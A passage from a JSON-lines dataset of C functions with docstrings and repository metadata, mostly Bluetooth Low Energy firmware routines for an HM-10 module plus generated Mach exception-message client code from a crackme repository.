*/\n\n#if\tUseStaticTemplates\n\tconst static mach_msg_port_descriptor_t taskTemplate = {\n\t\t/* name = */\t\tMACH_PORT_NULL,\n\t\t/* pad1 = */\t\t0,\n\t\t/* pad2 = */\t\t0,\n\t\t/* disp = */\t\t19,\n\t\t/* type = */\t\tMACH_MSG_PORT_DESCRIPTOR,\n\t};\n#endif\t/* UseStaticTemplates */\n\n\tInP->msgh_body.msgh_descriptor_count = 2;\n#if\tUseStaticTemplates\n\tInP->thread = threadTemplate;\n\tInP->thread.name = thread;\n#else\t/* UseStaticTemplates */\n\tInP->thread.name = thread;\n\tInP->thread.disposition = 19;\n\tInP->thread.type = MACH_MSG_PORT_DESCRIPTOR;\n#endif\t/* UseStaticTemplates */\n\n#if\tUseStaticTemplates\n\tInP->task = taskTemplate;\n\tInP->task.name = task;\n#else\t/* UseStaticTemplates */\n\tInP->task.name = task;\n\tInP->task.disposition = 19;\n\tInP->task.type = MACH_MSG_PORT_DESCRIPTOR;\n#endif\t/* UseStaticTemplates */\n\n\tInP->NDR = NDR_record;\n\n\tInP->exception = exception;\n\n\tif (codeCnt > 2) {\n\t\t{ return MIG_ARRAY_TOO_LARGE; }\n\t}\n\t(void)memcpy((char *) InP->code, (const char *) code, 8 * codeCnt);\n\n\tInP->codeCnt = codeCnt;\n\n\tmsgh_size_delta = (8 * codeCnt);\n\tmsgh_size = (mach_msg_size_t)(sizeof(Request) - 592) + msgh_size_delta;\n\tInP = (Request *) ((pointer_t) InP + msgh_size_delta - 16);\n\n\tInP->flavor = *flavor;\n\n\tif (old_stateCnt > 144) {\n\t\t{ return MIG_ARRAY_TOO_LARGE; }\n\t}\n\t(void)memcpy((char *) InP->old_state, (const char *) old_state, 4 * old_stateCnt);\n\n\tInP->old_stateCnt = old_stateCnt;\n\n\tmsgh_size += (4 * old_stateCnt);\n\tInP = &Mess.In;\n\tInP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|\n\t\tMACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);\n\t/* msgh_size passed as argument */\n\tInP->Head.msgh_request_port = exception_port;\n\tInP->Head.msgh_reply_port = mig_get_reply_port();\n\tInP->Head.msgh_id = 2407;\n\n\t__BeforeSendRpc(2407, \"mach_exception_raise_state_identity\")\n\tmsg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);\n\t__AfterSendRpc(2407, \"mach_exception_raise_state_identity\")\n\tif (msg_result != MACH_MSG_SUCCESS) {\n\t\t__MachMsgErrorWithoutTimeout(msg_result);\n\t\t{ return msg_result; }\n\t}\n\n\n#if\tdefined(__MIG_check__Reply__mach_exception_raise_state_identity_t__defined)\n\tcheck_result = __MIG_check__Reply__mach_exception_raise_state_identity_t((__Reply__mach_exception_raise_state_identity_t *)Out0P);\n\tif (check_result != MACH_MSG_SUCCESS)\n\t\t{ return check_result; }\n#endif\t/* defined(__MIG_check__Reply__mach_exception_raise_state_identity_t__defined) */\n\n\t*flavor = Out0P->flavor;\n\n\tif (Out0P->new_stateCnt > 144) {\n\t\t(void)memcpy((char *) new_state, (const char *) Out0P->new_state, 4 *  144);\n\t\t*new_stateCnt = Out0P->new_stateCnt;\n\t\t{ return MIG_ARRAY_TOO_LARGE; }\n\t}\n\t(void)memcpy((char *) new_state, (const char *) Out0P->new_state, 4 * Out0P->new_stateCnt);\n\n\t*new_stateCnt = Out0P->new_stateCnt;\n\n\treturn KERN_SUCCESS;\n}", "path": "crackme\\mach_excUser.c", "repo_name": "gdbinit/crackme_nr1", "stars": 37, "license": "None", "language": "c", "size": 267}
{"docstring": "/**\n * @brief      UART event callback\n */\n", "func_signal": "static void HalUARTCback(uint8 port, uint8 event)", "code": "{\n  switch(event)\n  {\n    case HAL_UART_RX_FULL:\n    case HAL_UART_RX_ABOUT_FULL:\n    case HAL_UART_RX_TIMEOUT:\n    case HAL_UART_TX_FULL:\n    case HAL_UART_TX_EMPTY:\n      break;\n  }\n}", "path": "BLE-CC254x-1.4.0\\Projects\\ble\\HM10Firmware\\Source\\uartManager.c", "repo_name": "bjoerke/HM-10-Firmware", "stars": 54, "license": "None", "language": "c", "size": 292}
{"docstring": "/*********************************************************************\n * @fn      gapCentralRole_timerCB\n *\n * @brief   OSAL timer callback function\n *\n * @param   pData - Data pointer\n *\n * @return  none\n */\n", "func_signal": "static void gapCentralRole_timerCB( uint8 *pData )", "code": "{\n  gapCentralRoleRssiEvent_t *pMsg;\n\n  // Timer has expired so clear timer ID\n  ((gapCentralRoleRssi_t *) pData)->timerId = INVALID_TIMER_ID;\n\n  // Send OSAL message\n  pMsg = (gapCentralRoleRssiEvent_t *) osal_msg_allocate( sizeof(gapCentralRoleRssiEvent_t) );\n  if ( pMsg )\n  {\n    pMsg->hdr.event = GAPCENTRALROLE_RSSI_MSG_EVT;\n    pMsg->pRssi = (gapCentralRoleRssi_t *) pData;\n\n    osal_msg_send ( gapCentralRoleTaskId, (uint8 *) pMsg );\n  }\n}", "path": "BLE-CC254x-1.4.0\\Projects\\ble\\HM10Firmware\\Source\\centralBroadcasterProfile.c", "repo_name": "bjoerke/HM-10-Firmware", "stars": 54, "license": "None", "language": "c", "size": 292}
{"docstring": "/*********************************************************************\n * @fn      gapCentralRole_ProcessOSALMsg\n *\n * @brief   Process an incoming task message.\n *\n * @param   pMsg - message to process\n *\n * @return  none\n */\n", "func_signal": "static void gapCentralRole_ProcessOSALMsg( osal_event_hdr_t *pMsg )", "code": "{\n  switch ( pMsg->event )\n  {\n    case HCI_GAP_EVENT_EVENT:\n      if ( pMsg->status == HCI_COMMAND_COMPLETE_EVENT_CODE )\n      {\n        hciEvt_CmdComplete_t *pPkt = (hciEvt_CmdComplete_t *) pMsg;\n\n        if ( pPkt->cmdOpcode == HCI_READ_RSSI )\n        {\n          uint16 connHandle = BUILD_UINT16( pPkt->pReturnParam[1], pPkt->pReturnParam[2] );\n          int8 rssi = (int8) pPkt->pReturnParam[3];\n\n          // Report RSSI to app\n          if ( pGapCentralRoleCB && pGapCentralRoleCB->rssiCB )\n          {\n            pGapCentralRoleCB->rssiCB( connHandle, rssi );\n          }\n        }\n      }\n      break;\n\n    case GAP_MSG_EVENT:\n      gapCentralRole_ProcessGAPMsg( (gapEventHdr_t *) pMsg );\n      break;\n\n    case GAPCENTRALROLE_RSSI_MSG_EVT:\n      {\n        gapCentralRoleRssi_t *pRssi = ((gapCentralRoleRssiEvent_t *) pMsg)->pRssi;\n\n        // If link is up and RSSI reads active\n        if (pRssi->connHandle != GAP_CONNHANDLE_ALL &&\n            linkDB_Up(pRssi->connHandle))\n        {\n          // Restart timer\n          osal_CbTimerStart( gapCentralRole_timerCB, (uint8 *) pRssi,\n                             pRssi->period, &pRssi->timerId );\n\n          // Read RSSI\n          VOID HCI_ReadRssiCmd( pRssi->connHandle );\n        }\n      }\n      break;\n\n    default:\n      break;\n  }\n}", "path": "BLE-CC254x-1.4.0\\Projects\\ble\\HM10Firmware\\Source\\centralBroadcasterProfile.c", "repo_name": "bjoerke/HM-10-Firmware", "stars": 54, "license": "None", "language": "c", "size": 292}
{"docstring": "/**\n * @brief   Central Profile Task event processing function.\n *\n * @param   taskId - Task ID\n * @param   events - Events.\n *\n * @return  events not processed\n */\n", "func_signal": "uint16 GAPCentralRole_ProcessEvent( uint8 taskId, uint16 events )", "code": "{\n  if ( events & SYS_EVENT_MSG )\n  {\n    uint8 *pMsg;\n\n    if ( (pMsg = osal_msg_receive( gapCentralRoleTaskId )) != NULL )\n    {\n      gapCentralRole_ProcessOSALMsg( (osal_event_hdr_t *) pMsg );\n\n      // Release the OSAL message\n      VOID osal_msg_deallocate( pMsg );\n    }\n\n    // return unprocessed events\n    return (events ^ SYS_EVENT_MSG);\n  }\n\n  if ( events & GAP_EVENT_SIGN_COUNTER_CHANGED )\n  {\n    // Sign counter changed, save it to NV\n    VOID osal_snv_write( BLE_NVID_SIGNCOUNTER, sizeof( uint32 ), &gapCentralRoleSignCounter );\n\n    return ( events ^ GAP_EVENT_SIGN_COUNTER_CHANGED );\n  }\n\n  if ( events & START_ADVERTISING_EVT )\n  {\n    if ( gapRole_AdvEnabled )\n    {\n      gapAdvertisingParams_t params;\n\n      // Setup advertisement parameters\n      params.eventType = gapRole_AdvEventType;\n      params.initiatorAddrType = gapRole_AdvDirectType;\n      VOID osal_memcpy( params.initiatorAddr, gapRole_AdvDirectAddr, B_ADDR_LEN );\n      params.channelMap = gapRole_AdvChanMap;\n      params.filterPolicy = gapRole_AdvFilterPolicy;\n\n      if ( GAP_MakeDiscoverable( gapRole_TaskID, &params ) != SUCCESS )\n      {\n        gapRole_state = GAPROLE_ERROR;\n        // Notify the application\n        if ( pGapCentralRoleCB && pGapCentralRoleCB->broadcastCB )\n        {\n          pGapCentralRoleCB->broadcastCB( gapRole_state );\n        }\n      }\n    }\n\n    return ( events ^ START_ADVERTISING_EVT );\n  }  \n  \n  \n  \n  // Discard unknown events\n  return 0;\n}", "path": "BLE-CC254x-1.4.0\\Projects\\ble\\HM10Firmware\\Source\\centralBroadcasterProfile.c", "repo_name": "bjoerke/HM-10-Firmware", "stars": 54, "license": "None", "language": "c", "size": 292}
{"docstring": "/**\n * @brief   Central Profile Task initialization function.\n *\n * @param   taskId - Task ID.\n *\n * @return  void\n */\n", "func_signal": "void GAPCentralRole_Init( uint8 taskId )", "code": "{\n  uint8 i;\n\n  gapCentralRoleTaskId = taskId;\n  gapRole_TaskID = taskId;\n\n  // Initialize internal data\n  for ( i = 0; i < GAPCENTRALROLE_NUM_RSSI_LINKS; i++ )\n  {\n    gapCentralRoleRssi[i].connHandle = GAP_CONNHANDLE_ALL;\n    gapCentralRoleRssi[i].timerId = INVALID_TIMER_ID;\n  }\n\n  // Initialize parameters\n\n  // Retore items from NV\n  VOID osal_snv_read( BLE_NVID_IRK, KEYLEN, gapCentralRoleIRK );\n  VOID osal_snv_read( BLE_NVID_CSRK, KEYLEN, gapCentralRoleSRK );\n  VOID osal_snv_read( BLE_NVID_SIGNCOUNTER, sizeof( uint32 ), &gapCentralRoleSignCounter );\n\n  // Register for HCI messages (for RSSI)\n  GAP_RegisterForHCIMsgs( taskId );\n  \n  gapRole_AdvEventType = GAP_ADTYPE_ADV_NONCONN_IND;\n  gapRole_AdvDirectType = ADDRTYPE_PUBLIC;\n  gapRole_AdvChanMap = GAP_ADVCHAN_ALL;\n  gapRole_AdvFilterPolicy = GAP_FILTER_POLICY_ALL;  \n}", "path": "BLE-CC254x-1.4.0\\Projects\\ble\\HM10Firmware\\Source\\centralBroadcasterProfile.c", "repo_name": "bjoerke/HM-10-Firmware", "stars": 54, "license": "None", "language": "c", "size": 292}
{"docstring": "/**\n * @brief   Update the link connection parameters.\n *\n * Public function defined in central.h.\n */\n", "func_signal": "bStatus_t GAPCentralRole_UpdateLink( uint16 connHandle, uint16 connIntervalMin,\n                                     uint16 connIntervalMax, uint16 connLatency,\n                                     uint16 connTimeout )", "code": "{\n  return (bStatus_t) HCI_LE_ConnUpdateCmd( connHandle, connIntervalMin,\n                                            connIntervalMax, connLatency,\n                                            connTimeout, 0, 0 );\n}", "path": "BLE-CC254x-1.4.0\\Projects\\ble\\HM10Firmware\\Source\\centralBroadcasterProfile.c", "repo_name": "bjoerke/HM-10-Firmware", "stars": 54, "license": "None", "language": "c", "size": 292}
{"docstring": "/**\n * @brief   Cancel periodic RSSI reads on a link.\n *\n * Public function defined in central.h.\n */\n", "func_signal": "bStatus_t GAPCentralRole_CancelRssi(uint16 connHandle )", "code": "{\n  gapCentralRoleRssi_t  *pRssi;\n\n  if ((pRssi = gapCentralRole_RssiFind( connHandle )) != NULL)\n  {\n    // Stop timer\n    osal_CbTimerStop( pRssi->timerId );\n\n    // Free RSSI structure\n    gapCentralRole_RssiFree( connHandle );\n\n    return SUCCESS;\n  }\n\n  // Not found\n  return bleIncorrectMode;\n}", "path": "BLE-CC254x-1.4.0\\Projects\\ble\\HM10Firmware\\Source\\centralBroadcasterProfile.c", "repo_name": "bjoerke/HM-10-Firmware", "stars": 54, "license": "None", "language": "c", "size": 292}
{"docstring": "/***************************\n * @fn       execute_command()\n * @breif    executes the command send over serial\n */\n", "func_signal": "static void execute_command()", "code": "{\n  switch(opcode)\n  {\n  case OPCODE_TEST:\n    send_ack();\n    break;\n  case OPCODE_SET_ADVERTISING_DATA:\n    {\n      if(payloadLength > ADVERTISING_DATA_LEN_MAX)\n      {\n        send_nck();\n        break;\n      }\n      setAdvertisingDataMsg_t* msg = (setAdvertisingDataMsg_t*) osal_msg_allocate(sizeof(setAdvertisingDataMsg_t));\n      msg->event = CB_MSG_SET_ADVERTISING_DATA;\n      msg->length = payloadLength;\n      osal_memcpy(\n                  &msg->data,\n                  &payloadData,\n                  payloadLength\n                );\n      osal_msg_send(simpleBLETaskId, (uint8*) msg);\n      send_ack();\n      break;\n    }\n  case OPCODE_SET_NAME:\n    {\n      if(payloadLength > NAME_LENGTH_MAX)\n      {\n        send_nck();\n        break;\n      }\n      setNameMsg_t* msg = (setNameMsg_t*) osal_msg_allocate(sizeof(setNameMsg_t));\n      msg->event = CB_MSG_SET_NAME;\n      msg->length = payloadLength;\n      osal_memcpy(&msg->name, &payloadData, payloadLength);\n      osal_msg_send(simpleBLETaskId, (uint8*) msg);\n      send_ack();\n      break;\n    }      \n  case OPCODE_GET_FIRMWARE_INFO_STRING:\n    {\n       uint8 length = osal_strlen((char*) firmwareInfoString);\n       HalUARTWrite(HAL_UART_PORT_1, &length, 1);\n       HalUARTWrite(HAL_UART_PORT_1, firmwareInfoString, length);\n    }\n     break;\n  case OPCODE_START:\n    osal_set_event( simpleBLETaskId, CB_START_DEVICE_EVT );\n    send_ack();\n    break;\n  case OPCODE_STOP:\n    osal_set_event( simpleBLETaskId, CB_STOP_DEVICE_EVT );\n    send_ack();\n    break;\n  }\n}", "path": "BLE-CC254x-1.4.0\\Projects\\ble\\HM10Firmware\\Source\\uartManager.c", "repo_name": "bjoerke/HM-10-Firmware", "stars": 54, "license": "None", "language": "c", "size": 292}
{"docstring": "/**\n * @brief   Get a parameter in the Central Profile.\n *\n * Public function defined in central.h.\n */\n", "func_signal": "bStatus_t GAPCentralRole_GetParameter( uint16 param, void *pValue )", "code": "{\n  bStatus_t ret = SUCCESS;\n\n  switch ( param )\n  {\n    case GAPCENTRALROLE_IRK:\n      VOID osal_memcpy( pValue, gapCentralRoleIRK, KEYLEN ) ;\n      break;\n\n    case GAPCENTRALROLE_SRK:\n      VOID osal_memcpy( pValue, gapCentralRoleSRK, KEYLEN ) ;\n      break;\n\n    case GAPCENTRALROLE_SIGNCOUNTER:\n      *((uint32*)pValue) = gapCentralRoleSignCounter;\n      break;\n\n    case GAPCENTRALROLE_BD_ADDR:\n      VOID osal_memcpy( pValue, gapCentralRoleBdAddr, B_ADDR_LEN ) ;\n      break;\n\n    case GAPCENTRALROLE_MAX_SCAN_RES:\n      *((uint8*)pValue) = gapCentralRoleMaxScanRes;\n      break;\n\n    default:\n      ret = INVALIDPARAMETER;\n      break;\n  }\n\n  return ret;\n}", "path": "BLE-CC254x-1.4.0\\Projects\\ble\\HM10Firmware\\Source\\centralBroadcasterProfile.c", "repo_name": "bjoerke/HM-10-Firmware", "stars": 54, "license": "None", "language": "c", "size": 292}
{"docstring": "/*********************************************************************\n * @brief   Set a GAP Role parameter.\n *\n * Public function defined in broadcaster.h.\n */\n", "func_signal": "bStatus_t GAPRole_SetParameter( uint16 param, uint8 len, void *pValue )", "code": "{\n  bStatus_t ret = SUCCESS;\n  switch ( param )\n  {\n    case GAPROLE_ADVERT_ENABLED:\n      if ( len == sizeof( uint8 ) )\n      {\n        uint8 oldAdvEnabled = gapRole_AdvEnabled;\n        gapRole_AdvEnabled = *((uint8*)pValue);\n\n        if ( (oldAdvEnabled) && (gapRole_AdvEnabled == FALSE) )\n        {\n          // Turn off Advertising\n          if ( gapRole_state == GAPROLE_ADVERTISING )\n          {\n            VOID GAP_EndDiscoverable( gapRole_TaskID );\n          }\n        }\n        else if ( (oldAdvEnabled == FALSE) && (gapRole_AdvEnabled) )\n        {\n          // Turn on Advertising\n          if ( (gapRole_state == GAPROLE_STARTED)\n              || (gapRole_state == GAPROLE_WAITING) )\n          {\n            VOID osal_set_event( gapRole_TaskID, START_ADVERTISING_EVT );\n          }\n        }\n      }\n      else\n      {\n        ret = bleInvalidRange;\n      }\n      break;\n\n    case GAPROLE_ADVERT_OFF_TIME:\n      if ( len == sizeof ( uint16 ) )\n      {\n        gapRole_AdvertOffTime = *((uint16*)pValue);\n      }\n      else\n      {\n        ret = bleInvalidRange;\n      }\n      break;\n\n    case GAPROLE_ADVERT_DATA:\n      if ( len <= B_MAX_ADV_LEN )\n      {\n        VOID osal_memset( gapRole_AdvertData, 0, B_MAX_ADV_LEN );\n        VOID osal_memcpy( gapRole_AdvertData, pValue, len );\n        gapRole_AdvertDataLen = len;\n      }\n      else\n      {\n        ret = bleInvalidRange;\n      }\n      break;\n\n    case GAPROLE_SCAN_RSP_DATA:\n      if ( len <= B_MAX_ADV_LEN )\n      {\n        VOID osal_memset( gapRole_ScanRspData, 0, B_MAX_ADV_LEN );\n        VOID osal_memcpy( gapRole_ScanRspData, pValue, len );\n        gapRole_ScanRspDataLen = len;\n      }\n      else\n      {\n        ret = bleInvalidRange;\n      }\n      break;\n\n    case GAPROLE_ADV_EVENT_TYPE:\n      if ( (len == sizeof ( uint8 )) && (*((uint8*)pValue) <= GAP_ADTYPE_ADV_NONCONN_IND) )\n      {\n        gapRole_AdvEventType = *((uint8*)pValue);\n      }\n      else\n      {\n        ret = bleInvalidRange;\n      }\n      break;\n\n    case GAPROLE_ADV_DIRECT_TYPE:\n      if ( (len == sizeof ( uint8 )) && (*((uint8*)pValue) <= ADDRTYPE_PRIVATE_RESOLVE) )\n      {\n        gapRole_AdvDirectType = *((uint8*)pValue);\n      }\n      else\n      {\n        ret = bleInvalidRange;\n      }\n      break;\n\n    case GAPROLE_ADV_DIRECT_ADDR:\n      if ( len == B_ADDR_LEN )\n      {\n        VOID osal_memcpy( gapRole_AdvDirectAddr, pValue, B_ADDR_LEN ) ;\n      }\n      else\n      {\n        ret = bleInvalidRange;\n      }\n      break;\n\n    case GAPROLE_ADV_CHANNEL_MAP:\n      if ( (len == sizeof ( uint8 )) && (*((uint8*)pValue) <= 0x07) )\n      {\n        gapRole_AdvChanMap = *((uint8*)pValue);\n      }\n      else\n      {\n        ret = bleInvalidRange;\n      }\n      break;\n\n    case GAPROLE_ADV_FILTER_POLICY:\n      if ( (len == sizeof ( uint8 )) && (*((uint8*)pValue) <= GAP_FILTER_POLICY_WHITE) )\n      {\n        gapRole_AdvFilterPolicy = *((uint8*)pValue);\n      }\n      else\n      {\n        ret = bleInvalidRange;\n      }\n      break;\n\n    default:\n      // The param value isn't part of this profile, try the GAP.\n      if ( (param < TGAP_PARAMID_MAX) && (len == sizeof ( uint16 )) )\n      {\n        ret = GAP_SetParamValue( param, *((uint16*)pValue) );\n      }\n      else\n      {\n        ret = INVALIDPARAMETER;\n      }\n      break;\n  }\n\n  return ( ret );\n}", "path": "BLE-CC254x-1.4.0\\Projects\\ble\\HM10Firmware\\Source\\centralBroadcasterProfile.c", "repo_name": "bjoerke/HM-10-Firmware", "stars": 54, "license": "None", "language": "c", "size": 292}
{"docstring": "/**\n * @brief   Set a parameter in the Central Profile.\n *\n * Public function defined in central.h.\n */\n", "func_signal": "bStatus_t GAPCentralRole_SetParameter( uint16 param, uint8 len, void *pValue )", "code": "{\n  bStatus_t ret = SUCCESS;\n\n  switch ( param )\n  {\n    case GAPCENTRALROLE_IRK:\n      if ( len == KEYLEN )\n      {\n        VOID osal_memcpy( gapCentralRoleIRK, pValue, KEYLEN ) ;\n      }\n      else\n      {\n        ret = bleInvalidRange;\n      }\n      break;\n\n    case GAPCENTRALROLE_SRK:\n      if ( len == KEYLEN )\n      {\n        VOID osal_memcpy( gapCentralRoleSRK, pValue, KEYLEN ) ;\n      }\n      else\n      {\n        ret = bleInvalidRange;\n      }\n      break;\n\n    case GAPCENTRALROLE_SIGNCOUNTER:\n      if ( len == sizeof ( uint32 ) )\n      {\n        gapCentralRoleSignCounter = *((uint32*)pValue);\n      }\n      else\n      {\n        ret = bleInvalidRange;\n      }\n      break;\n\n    case GAPCENTRALROLE_MAX_SCAN_RES:\n      if ( len == sizeof ( uint8 ) )\n      {\n        gapCentralRoleMaxScanRes = *((uint8*)pValue);\n      }\n      else\n      {\n        ret = bleInvalidRange;\n      }\n      break;\n\n    default:\n      ret = INVALIDPARAMETER;\n      break;\n  }\n\n  return ret;\n}", "path": "BLE-CC254x-1.4.0\\Projects\\ble\\HM10Firmware\\Source\\centralBroadcasterProfile.c", "repo_name": "bjoerke/HM-10-Firmware", "stars": 54, "license": "None", "language": "c", "size": 292}
{"docstring": "/**\n * @brief   Establish a link to a peer device.\n *\n * Public function defined in central.h.\n */\n", "func_signal": "bStatus_t GAPCentralRole_EstablishLink( uint8 highDutyCycle, uint8 whiteList,\n                                        uint8 addrTypePeer, uint8 *peerAddr )", "code": "{\n  gapEstLinkReq_t params;\n\n  params.taskID = gapCentralRoleTaskId;\n  params.highDutyCycle = highDutyCycle;\n  params.whiteList = whiteList;\n  params.addrTypePeer = addrTypePeer;\n  VOID osal_memcpy( params.peerAddr, peerAddr, B_ADDR_LEN );\n\n  return GAP_EstablishLinkReq( &params );\n}", "path": "BLE-CC254x-1.4.0\\Projects\\ble\\HM10Firmware\\Source\\centralBroadcasterProfile.c", "repo_name": "bjoerke/HM-10-Firmware", "stars": 54, "license": "None", "language": "c", "size": 292}
{"docstring": "/*********************************************************************\n * @fn      uartManager_ProcessOSALMsg\n * @brief   Process an incoming task message.\n * @param   pMsg - message to process\n * @return  none\n */\n", "func_signal": "static void uartManager_ProcessOSALMsg( osal_event_hdr_t *pMsg )", "code": "{\n  switch ( pMsg->event )\n  {\n    case CB_MSG_DEVICE_FOUND:\n    {\n      deviceFoundMsg_t* msg = (deviceFoundMsg_t*) pMsg;\n      msg->event = RESPONSE_DEVICE_FOUND;\n      HalUARTWrite(HAL_UART_PORT_1, (uint8*) msg, msg->length + sizeof(uint8) + sizeof(uint8) );\n      break;\n    }\n  }\n}", "path": "BLE-CC254x-1.4.0\\Projects\\ble\\HM10Firmware\\Source\\uartManager.c", "repo_name": "bjoerke/HM-10-Firmware", "stars": 54, "license": "None", "language": "c", "size": 292}
{"docstring": "/**\n * @brief   Start periodic RSSI reads on a link.\n *\n * Public function defined in central.h.\n */\n", "func_signal": "bStatus_t GAPCentralRole_StartRssi( uint16 connHandle, uint16 period )", "code": "{\n  gapCentralRoleRssi_t  *pRssi;\n\n  // Verify link is up\n  if (!linkDB_Up(connHandle))\n  {\n    return bleIncorrectMode;\n  }\n\n  // If already allocated\n  if ((pRssi = gapCentralRole_RssiFind( connHandle )) != NULL)\n  {\n    // Stop timer\n    osal_CbTimerStop( pRssi->timerId );\n  }\n  // Allocate structure\n  else if ((pRssi = gapCentralRole_RssiAlloc( connHandle )) != NULL)\n  {\n    pRssi->period = period;\n  }\n  // Allocate failed\n  else\n  {\n    return bleNoResources;\n  }\n\n  // Start timer\n  osal_CbTimerStart( gapCentralRole_timerCB, (uint8 *) pRssi,\n                     period, &pRssi->timerId );\n\n  return SUCCESS;\n}", "path": "BLE-CC254x-1.4.0\\Projects\\ble\\HM10Firmware\\Source\\centralBroadcasterProfile.c", "repo_name": "bjoerke/HM-10-Firmware", "stars": 54, "license": "None", "language": "c", "size": 292}
{"docstring": "/*********************************************************************\n * @fn      gapCentralRole_RssiFind\n *\n * @brief   Find an RSSI structure.\n *\n * @param   connHandle - Connection handle\n *\n * @return  pointer to structure or NULL if not found.\n */\n", "func_signal": "static gapCentralRoleRssi_t *gapCentralRole_RssiFind( uint16 connHandle )", "code": "{\n  uint8 i;\n\n  // Find free RSSI structure\n  for ( i = 0; i < GAPCENTRALROLE_NUM_RSSI_LINKS; i++ )\n  {\n    if ( gapCentralRoleRssi[i].connHandle == connHandle )\n    {\n      return &gapCentralRoleRssi[i];\n    }\n  }\n\n  // Not found\n  return NULL;\n}", "path": "BLE-CC254x-1.4.0\\Projects\\ble\\HM10Firmware\\Source\\centralBroadcasterProfile.c", "repo_name": "bjoerke/HM-10-Firmware", "stars": 54, "license": "None", "language": "c", "size": 292}
{"docstring": "/*********************************************************************\n * @fn      osalInitTasks\n *\n * @brief   This function invokes the initialization function for each task.\n *\n * @param   void\n *\n * @return  none\n */\n", "func_signal": "void osalInitTasks( void )", "code": "{\n  uint8 taskID = 0;\n\n  tasksEvents = (uint16 *)osal_mem_alloc( sizeof( uint16 ) * tasksCnt);\n  osal_memset( tasksEvents, 0, (sizeof( uint16 ) * tasksCnt));\n\n  /* LL Task */\n  LL_Init( taskID++ );\n\n  /* Hal Task */\n  Hal_Init( taskID++ );\n\n  /* HCI Task */\n  HCI_Init( taskID++ );\n\n#if defined ( OSAL_CBTIMER_NUM_TASKS )\n  /* Callback Timer Tasks */\n  osal_CbTimerInit( taskID );\n  taskID += OSAL_CBTIMER_NUM_TASKS;\n#endif\n\n  /* L2CAP Task */\n  L2CAP_Init( taskID++ );\n\n  /* GAP Task */\n  GAP_Init( taskID++ );\n\n  /* Profiles */\n  GAPCentralRole_Init( taskID++ );\n\n  /* Application */\n  uartManager_Init(taskID++);\n  SimpleBLECentral_Init(taskID);\n}", "path": "BLE-CC254x-1.4.0\\Projects\\ble\\HM10Firmware\\Source\\OSAL_centralBroadcaster.c", "repo_name": "bjoerke/HM-10-Firmware", "stars": 54, "license": "None", "language": "c", "size": 292}
{"docstring": "/*********************************************************************\n * @fn      gapCentralRole_ProcessGAPMsg\n *\n * @brief   Process an incoming task message from GAP.\n *\n * @param   pMsg - message to process\n *\n * @return  none\n */\n", "func_signal": "static void gapCentralRole_ProcessGAPMsg( gapEventHdr_t *pMsg )", "code": "{\n  \n  uint8 isBroadcastMsg = FALSE;\n  \n  switch ( pMsg->opcode )\n  {\n    case GAP_DEVICE_INIT_DONE_EVENT:\n      {\n        gapDeviceInitDoneEvent_t *pPkt = (gapDeviceInitDoneEvent_t *) pMsg;\n        bStatus_t stat = pPkt->hdr.status;\n        \n        if ( pPkt->hdr.status == SUCCESS )\n        {\n          // Save off the generated keys\n          VOID osal_snv_write( BLE_NVID_IRK, KEYLEN, gapCentralRoleIRK );\n          VOID osal_snv_write( BLE_NVID_CSRK, KEYLEN, gapCentralRoleSRK );\n\n          // Save off the information\n          VOID osal_memcpy( gapCentralRoleBdAddr, pPkt->devAddr, B_ADDR_LEN );\n          \n         ///////////////////////////////////////////////////////////////////////\n         // Broadcast\n\n          // Save off the information\n          VOID osal_memcpy( gapRole_bdAddr, pPkt->devAddr, B_ADDR_LEN );\n\n          gapRole_state = GAPROLE_STARTED;\n\n          // Update the advertising data\n          stat =GAP_UpdateAdvertisingData( gapRole_TaskID, TRUE,\n                                            gapRole_AdvertDataLen,\n                                            gapRole_AdvertData );\n        }\n        \n        if ( stat != SUCCESS )\n        {\n          gapRole_state = GAPROLE_ERROR;\n        }\n        \n        isBroadcastMsg = TRUE;        \n      }\n      break;\n\n    case GAP_LINK_ESTABLISHED_EVENT:\n      {\n        gapEstLinkReqEvent_t *pPkt = (gapEstLinkReqEvent_t *) pMsg;\n\n        if (pPkt->hdr.status == SUCCESS)\n        {\n          // Notify the Bond Manager of the connection\n          VOID GAPBondMgr_LinkEst( pPkt->devAddrType, pPkt->devAddr,\n                                   pPkt->connectionHandle, GAP_PROFILE_CENTRAL );\n        }\n      }\n      break;\n\n    case GAP_LINK_TERMINATED_EVENT:\n      {\n        uint16 connHandle = ((gapTerminateLinkEvent_t *) pMsg)->connectionHandle;\n\n        GAPBondMgr_ProcessGAPMsg( (gapEventHdr_t *)pMsg );\n\n        // Cancel RSSI reads\n        GAPCentralRole_CancelRssi( connHandle );\n      }\n      break;\n\n    // temporary workaround\n    case GAP_SLAVE_REQUESTED_SECURITY_EVENT:\n      GAPBondMgr_ProcessGAPMsg( pMsg );\n      break;\n\n    case GAP_ADV_DATA_UPDATE_DONE_EVENT:\n      {\n        gapAdvDataUpdateEvent_t *pPkt = (gapAdvDataUpdateEvent_t *)pMsg;\n\n        if ( pPkt->hdr.status == SUCCESS )\n        {\n          if ( pPkt->adType )\n          {\n            // Setup the Response Data\n            pPkt->hdr.status = GAP_UpdateAdvertisingData( gapRole_TaskID,\n                              FALSE, gapRole_ScanRspDataLen, gapRole_ScanRspData );\n          }\n          else\n          {\n            // Start advertising\n            VOID osal_set_event( gapRole_TaskID, START_ADVERTISING_EVT );\n          }\n        }\n\n        if ( pPkt->hdr.status != SUCCESS )\n        {\n          // Set into Error state\n          gapRole_state = GAPROLE_ERROR;\n          isBroadcastMsg = TRUE;\n        }\n      }\n      break;\n\n    case GAP_MAKE_DISCOVERABLE_DONE_EVENT:\n    case GAP_END_DISCOVERABLE_DONE_EVENT:\n      {\n        gapMakeDiscoverableRspEvent_t *pPkt = (gapMakeDiscoverableRspEvent_t *)pMsg;\n\n        if ( pPkt->hdr.status == SUCCESS )\n        {\n          if ( pMsg->opcode == GAP_MAKE_DISCOVERABLE_DONE_EVENT )\n          {\n            gapRole_state = GAPROLE_ADVERTISING;\n          }\n          else // GAP_END_DISCOVERABLE_DONE_EVENT\n          {\n\n            if ( gapRole_AdvertOffTime != 0 )\n            {\n              if ( ( gapRole_AdvEnabled ) )\n              {\n                VOID osal_start_timerEx( gapRole_TaskID, START_ADVERTISING_EVT, gapRole_AdvertOffTime );\n              }\n            